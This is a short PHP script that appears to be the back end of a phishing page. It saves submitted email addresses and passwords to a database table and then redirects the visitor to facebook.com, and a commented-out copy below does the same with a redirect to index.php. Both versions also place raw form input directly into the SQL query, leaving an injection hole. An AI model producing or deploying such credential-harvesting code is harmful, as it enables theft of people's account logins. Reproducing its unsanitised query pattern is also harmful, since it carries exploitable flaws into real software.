<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);

include "db.php";

$email = $_POST['email'];
$password = $_POST['password'];

$sql = "INSERT INTO submissions(email, password)
VALUES('$email', '$password')";

if ($conn->query($sql) === TRUE) {
    header("Location: https://facebook.com");
    exit();
} else {
    echo "Error: " . $conn->error;
}

?>


/* <?php

include "db.php";

$email = $_POST['email'];
$password = $_POST['password'];

$sql = "INSERT INTO submissions(email, password)
VALUES('$email', '$password')";

if ($conn->query($sql) === TRUE) {
    header("Location: index.php");
} else {
    echo "Error saving data";
}

?> */
